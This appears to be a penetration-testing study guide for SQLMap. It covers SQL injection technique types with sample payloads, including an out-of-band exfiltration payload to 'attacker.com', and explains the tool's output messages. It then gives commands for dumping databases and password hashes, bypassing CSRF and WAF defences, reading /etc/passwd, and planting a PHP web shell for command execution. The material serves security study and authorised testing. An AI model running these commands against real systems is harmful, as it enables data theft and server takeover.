# SQLMap Fundamentals
- https://github.com/sqlmapproject/sqlmap
- https://github.com/sqlmapproject/sqlmap/wiki/Usage
- Free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws.
- `sqlmap -hh` | `sqlmap -h`
- The technique characters BEUSTQ refers to the following:
    - B: Boolean-based blind
    - E: Error-based
    - U: Union query-based
    - S: Stacked queries
    - T: Time-based blind
    - Q: Inline queries

## Boolean-based blind
- `AND 1=1`
SQ- ap exploits Boolean-based blind SQL Injection vulnerabilities through the differentiation of TRUE from FALSE query results, effectively retrieving 1 byte of information per request. The differentiation is based on comparing server responses to determine whether the SQL query returned TRUE or FALSE. This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.
    - TRUE results are generally based on responses having none or marginal difference to the regular server response.
    - FALSE results are based on responses having substantial differences from the regular server response.
    - Boolean-based blind SQL Injection is considered as the most common SQLi type in web applications.
  
## Error-based SQL injection
- `AND GTID_SUBSET(@@version,0)`
- If the database management system (DBMS) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. 
- Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.

## UNION query-based
- `UNION ALL SELECT 1,@@version,3`
- With the usage of UNION, it is generally possible to extend the original (vulnerable) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. 
- This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.

## Stacked Queries
- `; DROP TABLE users`
- Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. INSERT, UPDATE or DELETE), stacking must be supported by the vulnerable platform (e.g., Microsoft SQL Server and PostgreSQL support it by default).

## Time-based blind SQL Injection
- `AND 1=IF(2>1,SLEEP(5),0)`
- The principle of Time-based blind SQL Injection is similar to the Boolean-based blind SQL Injection, but here the response time is used as the source for the differentiation between TRUE or FALSE.
    - TRUE response is generally characterized by the noticeable difference in the response time compared to the regular server response
    - FALSE response should result in a response time indistinguishable from regular response times
- Considerably slower than the boolean-based blind SQLi, since queries resulting in TRUE would delay the server response. This SQLi type is used in cases where Boolean-based blind SQL Injection is not applicable. 

## Inline Queries
- `SELECT (SELECT @@version) from`
- This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.

## Out-of-band SQL Injection
- `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
- This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.

## SQLMap Output Descriptions
### URL content is stable
- "target URL content is stable"
This means that there are no major changes between responses in case of continuous identical requests. This is important from the automation point of view since, in the event of stable responses, it is easier to spot differences caused by the potential SQLi attempts. While stability is important, SQLMap has advanced mechanisms to automatically remove the potential "noise" that could come from potentially unstable targets.

### Parameter appears to be dynamic
- "GET parameter 'id' appears to be dynamic"
It is always desired for the tested parameter to be "dynamic," as it is a sign that any changes made to its value would result in a change in the response; hence the parameter may be linked to a database. In case the output is "static" and does not change, it could be an indicator that the value of the tested parameter is not processed by the target, at least in the current context.

### Parameter might be injectable
- "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"
As discussed before, DBMS errors are a good indication of the potential SQLi. In this case, there was a MySQL error when SQLMap sends an intentionally invalid value was used (e.g. ?id=1",)..).))'), which indicates that the tested parameter could be SQLi injectable and that the target could be MySQL. It should be noted that this is not proof of SQLi, but just an indication that the detection mechanism has to be proven in the subsequent run.

### Parameter might be vulnerable to XSS attacks
- "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
While it is not its primary purpose, SQLMap also runs a quick heuristic test for the presence of an XSS vulnerability. In large-scale tests, where a lot of parameters are being tested with SQLMap, it is nice to have these kinds of fast heuristic checks, especially if there are no SQLi vulnerabilities found.

### Back-end DBMS is '...'
- "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"
In a normal run, SQLMap tests for all supported DBMSes. In case that there is a clear indication that the target is using the specific DBMS, we can narrow down the payloads to just that specific DBMS.

### Level/risk values
- "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"
If there is a clear indication that the target uses the specific DBMS, it is also possible to extend the tests for that same specific DBMS beyond the regular tests. This basically means running all SQL injection payloads for that specific DBMS, while if no DBMS were detected, only top payloads would be tested.

### Reflective values found
- "reflective value(s) found and filtering out"
Just a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk. However, SQLMap has filtering mechanisms to remove such junk before comparing the original page content.

### Parameter appears to be injectable
- "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"
This message indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding. In the case of boolean-based blind and similar SQLi types (e.g., time-based blind), where there is a high chance of false-positives, at the end of the run, SQLMap performs extensive testing consisting of simple logic checks for removal of false-positive findings.
Additionally, with --string="luther" indicates that SQLMap recognized and used the appearance of constant string value luther in the response for distinguishing TRUE from FALSE responses. This is an important finding because in such cases, there is no need for the usage of advanced internal mechanisms, such as dynamicity/reflection removal or fuzzy comparison of responses, which cannot be considered as false-positive.

### Time-based comparison statistical model
- "time-based comparison requires a larger statistical model, please wait........... (done)"
SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses. For this model to work, there is a requirement to collect a sufficient number of regular response times. This way, SQLMap can statistically distinguish between the deliberate delay even in the high-latency network environments.

### Extending UNION query injection technique tests
- "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"
UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types. To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value (i.e., 10) for this type of check. However, if there is a good chance that the target is vulnerable, especially as one other (potential) SQLi technique is found, SQLMap extends the default number of requests for UNION query SQLi, because of a higher expectancy of success.

### Technique appears to be usable
- "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"
As a heuristic check for the UNION-query SQLi type, before the actual UNION payloads are sent, a technique known as ORDER BY is checked for usability. In case that it is usable, SQLMap can quickly recognize the correct number of required UNION columns by conducting the binary-search approach.

### Parameter is vulnerable
- "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"
This is one of the most important messages of SQLMap, as it means that the parameter was found to be vulnerable to SQL injections. In the regular cases, the user may only want to find at least one injection point (i.e., parameter) usable against the target. However, if we were running an extensive test on the web application and want to report all potential vulnerabilities, we can continue searching for all vulnerable parameters.

### Sqlmap identified injection points

- "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"
Following after is a listing of all injection points with type, title, and payloads, which represents the final proof of successful detection and exploitation of found SQLi vulnerabilities. It should be noted that SQLMap lists only those findings which are provably exploitable (i.e., usable).

### Data logged to text files

- "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"
This indicates the local file system location used for storing all logs, sessions, and output data for a specific target - in this case, www.example.com. After such an initial run, where the injection point is successfully detected, all details for future runs are stored inside the same directory's session files. This means that SQLMap tries to reduce the required target requests as much as possible, depending on the session files' data.

## Running SQLMap on an HTTP Request
- One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing Copy as cURL feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools
- By pasting the clipboard content (Ctrl-V) into the command line, and changing the original command curl to sqlmap, we are able to use SQLMap with the identical curl command: `sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'`
- When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. --crawl, --forms or -g).
- For POST requests use the `--data` flag: `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'` In such cases, POST parameters uid and name will be tested for SQLi vulnerability.
- If we need to specify a complex HTTP request with lots of different header values and an elongated POST body, we can use the `-r` flag.  Either use Burp to save the request to a file or copy cURL again to a file to then do something like `sqlmap -r req.txt`
- similarly to the case with the '--data' flag, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.
- We can specify the cookie with `--cookie`, or `-H` | `--header` for headers, as well as `--host`, `--referer`, `--method` and `-A/--user-agent`
- There is a switch --random-agent designed to randomly select a User-agent header value from the included database of regular browser values, `--mobile` switch can be used to imitate the smartphone by using that same header value.

## SQLMap errors
- `--parse-errors`
- `-t`: to store traffic into an output file: `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`
- `-v`: sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
- `--proxy` to inspect via Burp

## Attack Tuning
- Every attack consists of 2 things: Vector (e.g., UNION ALL SELECT 1,2,VERSION()): central part of the payload, carrying the useful SQL code to be executed at the target. | Boundaries (e.g. '<vector>-- -): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.
- There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run: `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`
- There is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap but not on by default. For such demands, the options `--level` and `--risk` should be used:
    - The option `--level` (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
    - The option `--risk` (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
- Best way to check the differences between values is with the `-v` flag

## DB Enumeration
- Kitchen sink: `--dump-all`
- Enumeration usually starts with the retrieval of the basic information:
    - Database version banner (switch `--banner`)
    - Current user name (switch `--current-user`)
    - Current database name (switch `--current-db`)
    - Checking if the current user has DBA (administrator) rights (switch `--is-dba`)
- e.g `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`
- The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.
- After finding databases, look for tables next: `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`
- After spotting the table name of interest, retrieval of its content can be done by using the --dump option and specifying the table name with -T users, as follows: ` sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb`
- When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only name and surname columns) with the -C option: `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`
- Conditional enumeration: `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`
- DB schema enumeration: `sqlmap -u "http://www.example.com/?id=1" --schema`
- Searching for data: `sqlmap -u "http://www.example.com/?id=1" --search -T user`
- Search columns for spercific keywords: `sqlmap -u "http://www.example.com/?id=1" --search -C pass`
- Once we identify a table containing passwords (e.g. master.users), we can retrieve that table with the -T option: `sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users`
- For database specific credentails: `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`
- The `--all` switch in combination with the `--batch` switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.

## Bypassing Web Application Protections
- One of the first lines of defense against the usage of automation tools is the incorporation of anti-CSRF (i.e., Cross-Site Request Forgery) tokens into all HTTP requests, especially those generated as a result of web-form filling. Nevertheless, SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option is --csrf-token.
- `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`
- In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content, use `--randomize`: `sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI`
- Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g. h=MD5(id)) of another one. To bypass this, the option `--eval` should be used: `sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI`
- Use `--proxy` for anonymity through a proxy
- Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. ?pfov=...) to test for the existence of a WAF (Web Application Firewall). 
- In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. User-agent: sqlmap/1.4.9 (http://sqlmap.org)). This is trivial to bypass with the switch `--random-agent`, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.
- Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the Chunked transfer encoding, turned on using the switch `--chunked`, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.
- SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS. SQLMap can also attempt to give us direct command execution on the remote host if we had the proper privileges.
- Check for DBA privs: `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`
- Read local files: `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` then `cat ~/.sqlmap/output/www.example.com/files/_etc_passwd`

## Writing local files (ie shell)
- When it comes to writing files to the hosting server, it becomes much more restricted in modern DMBSes, since we can utilize this to write a Web Shell on the remote server, and hence get code execution and take over the server.
- This is why modern DBMSes disable file-write by default and need certain privileges for DBA's to be able to write files. 
- Still, many web applications require the ability for DBMSes to write data into files, so it is worth testing whether we can write files to the remote server. To do that with SQLMap, we can use the --file-write and --file-dest options. 
- Basic php shell `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
- Write this file to server: `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`
- Access script: `curl http://www.example.com/shell.php?cmd=ls+-la`
- SQLMap can do this for you - `sqlmap -u "http://www.example.com/?id=1" --os-shell` | `sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E`
- If it fails try different letters of the acronym at the top





